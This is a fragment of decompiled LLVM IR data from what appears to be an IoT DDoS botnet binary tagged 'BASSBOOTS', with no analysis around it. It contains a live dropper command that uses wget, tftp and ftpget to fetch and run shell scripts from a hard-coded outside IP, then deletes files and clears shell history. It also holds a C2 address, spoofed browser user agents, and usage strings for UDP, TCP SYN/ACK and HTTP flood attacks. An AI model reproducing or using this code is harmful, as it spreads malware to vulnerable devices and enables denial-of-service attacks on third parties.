0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18c3c.300, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_18c44.301, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18c54.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18c60.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18450.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18c68.304, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18418.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18c70.305, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18bb0.287, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c78.306, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18478.115, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18c80.307, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18c90.308, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18c80.307, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18c90.308, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18ca0.309, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18ca8.310, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18cb0.311, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186ac.169, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18cbc.312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18cc8.313, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18cd0.314, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18cdc.315, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18ce8.316, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18cf4.317, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d00.318, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d08.319, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d14.320, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d1c.321, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d28.322, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18d34.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18d34.323, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18d3c.324, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18478.115, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d48.325, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d50.326, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d58.327, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18d60.328, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18d6c.329, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18d74.330, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18d7c.331, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18d84.332, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18c60.303, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18418.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18c70.305, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d8c.333, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18d98.334, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18da0.335, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18638.158, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18450.111, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18da8.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18800.200, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18db0.337, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18440.109, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18db8.338, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18dc0.339, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18dcc.340, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18dd4.341, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_188b4.216, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18ddc.342, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18de4.343, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18dec.344, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18df4.345, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18800.200, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e00.346, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e08.347, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18e10.348, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e18.349, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_184a4.119, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_183f4.101, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18d98.334, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18530.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e24.350, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18924.226, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e30.351, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18e3c.352, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e08.347, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18e48.353, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18400.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18e50.354, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18440.109, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18440.109, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e58.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18e60.356, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e68.357, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18e74.358, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18e80.359, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_183e4.99, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18e88.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18e94.361, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18ea0.362, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18eac.363, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18eb8.364, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18484.116, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_18ec4.365, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18ed4.366, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18ee4.367, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18be4.292, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18be4.292, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18ef0.368, i32 0, i32 0)]
@global_var_23dbc.375 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f78.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f80.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18f88.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f94.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f9c.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18fa4.62, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18fac.63, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18fb0.52, i32 0, i32 0), i8* bitcast (i32* @global_var_18fb8.53 to i8*), i8* bitcast (i32* @global_var_18fbc.54 to i8*)]
@global_var_193f8.378 = constant i32 993090331
@global_var_19458.380 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_19460.382 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_18228.384 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_23140.385 = local_unnamed_addr global [443 x i8]* @global_var_18228.384
@global_var_19468.387 = constant [6 x i8] c"arfgG\00"
@global_var_19470.388 = constant [9 x i8] c"HBiug655\00"
@global_var_1947c.389 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1948c.390 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_194a0.391 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_194b4.392 = constant [12 x i8] c"GJjyur67458\00"
@global_var_194c0.393 = constant [12 x i8] c"RYSDk747586\00"
@global_var_194cc.394 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_194d8.395 = constant [10 x i8] c"KHGK7985i\00"
@global_var_194e4.396 = constant [11 x i8] c"yuituiILYF\00"
@global_var_194f0.397 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_19500.398 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1950c.399 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1951c.400 = constant [9 x i8] c"ewqdcftr\00"
@global_var_19528.401 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_19538.402 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_19544.403 = constant [12 x i8] c"twehgbferhb\00"
@global_var_19550.404 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1955c.405 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1956c.406 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1957c.407 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1958c.408 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_19598.409 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_195a8.410 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_195b8.411 = constant [12 x i8] c"yteytietyue\00"
@global_var_195c4.412 = constant [9 x i8] c"qsortEQS\00"
@global_var_195d0.413 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_195e0.414 = constant [4 x i8] c"std\00"
@global_var_195e4.415 = constant [4 x i8] c"dts\00"
@global_var_195e8.416 = constant [4 x i8] c"lsk\00"
@global_var_195ec.417 = constant [4 x i8] c"kek\00"
@global_var_195f0.418 = constant [6 x i8] c"smack\00"
@global_var_195f8.419 = constant [4 x i8] c"ily\00"
@global_var_195fc.420 = constant [4 x i8] c"tyf\00"
@global_var_19600.421 = constant [4 x i8] c"pos\00"
@global_var_19604.422 = constant [6 x i8] c"cunts\00"
@global_var_1960c.423 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19468.387, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19470.388, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1947c.389, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1948c.390, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_194a0.391, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_194b4.392, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_194c0.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_194cc.394, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_194d8.395, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_194e4.396, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_194f0.397, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19500.398, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1950c.399, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1951c.400, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_19528.401, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19538.402, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19544.403, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19550.404, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1955c.405, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1956c.406, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1957c.407, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1958c.408, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19598.409, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_195a8.410, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_195b8.411, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_195c4.412, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_195d0.413, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_195e0.414, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_195e4.415, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_195e8.416, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_195ec.417, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_195f0.418, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_195f8.419, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_195fc.420, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19600.421, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19604.422, i32 0, i32 0)]
@global_var_17538.425 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_17578.426 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_175bc.427 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_17600.428 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_17644.429 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_17688.430 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_176cc.431 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_17710.432 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_17780.433 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_177f4.434 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_17840.435 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_178c8.436 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_17914.437 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_17984.438 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_179f4.439 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_17a68.440 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_17ae0.441 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_17b28.442 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_17b58.443 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_17b98.444 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_17be4.445 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_17c5c.446 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_17ccc.447 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_17d3c.448 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_17db0.449 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_17e44.450 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_17e8c.451 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_17ed4.452 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_17f14.453 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_17f90.454 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_17ff8.455 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_18074.456 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_180c4.457 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_18118.458 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_1816c.459 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_181c0.460 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_18214.461 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_230ac.462 = global [37 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_17538.425, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_17578.426, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_175bc.427, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_17600.428, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_17644.429, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_17688.430, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_176cc.431, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_17710.432, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_17780.433, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_177f4.434, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_17840.435, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_178c8.436, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_17914.437, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_17984.438, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_179f4.439, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_17a68.440, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_17ae0.441, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_17b28.442, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_17b58.443, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_17b98.444, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_17be4.445, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_17c5c.446, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_17ccc.447, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_17d3c.448, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_17db0.449, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_17e44.450, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_17e8c.451, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_17ed4.452, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_17f14.453, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_17f90.454, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_17ff8.455, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_18074.456, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_180c4.457, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18118.458, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1816c.459, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_181c0.460, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_18214.461, i32 0, i32 0)]
@global_var_1969c.464 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_196dc.467 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_196f8.469 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1971c.474 = constant [4 x i8] c"all\00"
@global_var_19720.476 = constant i32 44
@global_var_19724.478 = constant [4 x i8] c"syn\00"
@global_var_19728.480 = constant [4 x i8] c"rst\00"
@global_var_1972c.482 = constant [4 x i8] c"fin\00"
@global_var_19730.484 = constant [4 x i8] c"ack\00"
@global_var_19734.486 = constant [4 x i8] c"psh\00"
@global_var_19738.488 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1974c.492 = constant [6 x i8] c"PONG!\00"
@global_var_19754.494 = constant [6 x i8] c"PUSSY\00"
@global_var_1975c.496 = constant [4 x i8] c"OFF\00"
@global_var_2a3f8.498 = global i32 0
@global_var_19760.500 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_19770.502 = constant [3 x i8] c"ON\00"
@global_var_19774.504 = constant [5 x i8] c"HTTP\00"
@global_var_1977c.506 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_197a4.508 = constant [4 x i8] c"UDP\00"
@global_var_197a8.510 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1981c.513 = constant [4 x i8] c"TCP\00"
@global_var_19820.515 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_198dc.517 = constant [4 x i8] c"STD\00"
@global_var_198e0.519 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_198fc.521 = constant [5 x i8] c"STOP\00"
@global_var_23d48.526 = local_unnamed_addr global i32 -1
@global_var_2313c.528 = global [20 x i8]* @global_var_18214.461
@global_var_19904.530 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1990c.533 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1991c.535 = constant [11 x i8] c"\0900000000\09\00"
@global_var_24180.537 = global i32 0
@global_var_19928.539 = constant [10 x i8] c"BASSBOOTS\00"
@global_var_19934.541 = constant i32 0
